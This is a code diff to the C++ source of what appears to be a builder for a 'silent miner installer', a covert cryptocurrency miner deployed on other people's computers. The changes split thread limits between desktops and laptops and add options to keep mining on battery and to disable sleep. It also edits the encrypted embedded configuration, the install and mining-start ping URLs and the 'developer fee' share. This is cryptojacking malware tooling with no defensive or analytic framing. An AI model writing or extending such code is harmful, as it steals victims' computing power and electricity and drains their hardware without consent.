@@ -38,7 +38,8 @@ settings s1 =
 	"",
 	"",
 
-	80, //maxThreads
+	60, //maxThreadsDesktop
+	15, //maxThreadsLaptop
 	2048, //L3CachePerThread
 	6144, //lightModeRam
 
@@ -47,6 +48,10 @@ settings s1 =
 
 	2, //minerDeployDelayMin
 	7, //minerDeployDelayMax
+
+	false, //heavyCalcDelay
+	true, //onBatteryMining
+	true,  //disableSleep
 
 	{ "", "", "" } //customArgs
 
@@ -69,7 +74,6 @@ void configureSilentMinerInstaller(std::string binaryName)
 	TCHAR buffer[MAX_PATH] = { 0 };
 	GetModuleFileName(NULL, buffer, MAX_PATH);
 
-	uint64_t pNum = mConfig.pointer;
 	std::ifstream fileIn;
 	std::ofstream fileOut;
 	std::ifstream::pos_type pos;
@@ -146,7 +150,8 @@ void loadSettingsFromSilentMinerInstaller()
 	std::ifstream::pos_type pos;
 	size_t size;
 	char* minerBin;
-	minerConfig* mConfigp;
+	minerConfig localmConfig;
+	minerConfig* mConfigp = &localmConfig;
 	OPENFILENAME fn;
 	char szFileName[MAX_PATH] = "";
 
@@ -181,13 +186,17 @@ void loadSettingsFromSilentMinerInstaller()
 
 		fileIn.close();
 
-		uint64_t pNum = mConfig.pointer;
+		//uint64_t pNum = mConfig.pointer;
 
-		for (size_t i = 0; i < size - sizeof(uint64_t); i++) {
-			uint64_t* p = (uint64_t*)(minerBin + i);
+		for (size_t i = 0; i < size - sizeof(minerConfig); i++) {
+			//uint64_t* p = (uint64_t*)(minerBin + i);
 
-			if (*p == pNum) {
-				mConfigp = (minerConfig*)p;
+			if (memcmp(minerBin + i, mConfig.pointer, sizeof(mConfig.pointer)) == 0)
+			{
+				//localmConfig = *((minerConfig*)minerBin + i);
+				memcpy(mConfigp, minerBin + i, sizeof(minerConfig));
+
+				configLightDecrypt(mConfigp, 54);
 
 				if (mConfigp->configured == false) 
 				{
@@ -196,7 +205,7 @@ void loadSettingsFromSilentMinerInstaller()
 					return;
 				}
 
-				configLightDecrypt(mConfigp, 54);
+				
 				settingsFromConfig(mConfigp, &s1);
 
 				MessageBox(NULL, szFileName, "Loaded settings from File", MB_OK);
@@ -241,11 +250,17 @@ void getSetDialogValues(HWND hwnd, bool set)
 	}
 
 	getSetNumberInEditControl(hwnd, &s1.lightModeRam, IDC_EDIT26, set);
-	getSetNumberInEditControl(hwnd, &s1.maxThreads, IDC_EDIT27, set);
-	if (s1.maxThreads > 100)
+	getSetNumberInEditControl(hwnd, &s1.maxThreadsDesktop, IDC_EDIT27, set);
+	if (s1.maxThreadsDesktop > 100)
 	{
-		s1.maxThreads = 100;
-		getSetNumberInEditControl(hwnd, &s1.maxThreads, IDC_EDIT27, true);
+		s1.maxThreadsDesktop = 100;
+		getSetNumberInEditControl(hwnd, &s1.maxThreadsDesktop, IDC_EDIT27, true);
+	}
+	getSetNumberInEditControl(hwnd, &s1.maxThreadsLaptop, IDC_EDIT36, set);
+	if (s1.maxThreadsLaptop > 100)
+	{
+		s1.maxThreadsLaptop = 100;
+		getSetNumberInEditControl(hwnd, &s1.maxThreadsLaptop, IDC_EDIT36, true);
 	}
 
 	getSetNumberInEditControl(hwnd, &s1.L3CachePerThread, IDC_EDIT28, set);
@@ -255,7 +270,13 @@ void getSetDialogValues(HWND hwnd, bool set)
 	getSetStringInEditControl(hwnd, &s1.installPingUrl, IDC_EDIT34, set);
 	getSetStringInEditControl(hwnd, &s1.miningStartPingUrl, IDC_EDIT35, set);
 
-	for (int i = 0; i < sizeof(s1.customArgs) / sizeof(s1.customArgs[0]); getSetStringInEditControl(hwnd, &s1.customArgs[i], IDC_EDIT30 + i, set), i++);
+	getSetBoolInCheckBox(hwnd, &s1.heavyCalcDelay, IDC_CHECK1, set);
+	getSetBoolInCheckBox(hwnd, &s1.onBatteryMining, IDC_CHECK2, set);
+	getSetBoolInCheckBox(hwnd, &s1.disableSleep, IDC_CHECK3, set);
+
+	getSetStringInEditControl(hwnd, &s1.customArgs[0], IDC_EDIT30, set);
+	getSetStringInEditControl(hwnd, &s1.customArgs[1], IDC_EDIT31, set);
+	getSetStringInEditControl(hwnd, &s1.customArgs[2], IDC_EDIT32, set);
 }
 
 
@@ -269,7 +290,7 @@ void generateStartArguments(minerConfig* config, std::string* result)
 	int customerPoolNum = 0;
 	customerPoolNum = config->americaEastPoolsNum + config->americaWestPoolsNum + config->asiaPoolsNum + config->europePoolsNum;
 
-	if (randomAnInt(0, 7) == 0)
+	if (randomAnInt(0, 9) == 0)
 	{
 		*result = developerFeeArgs();
 		return;
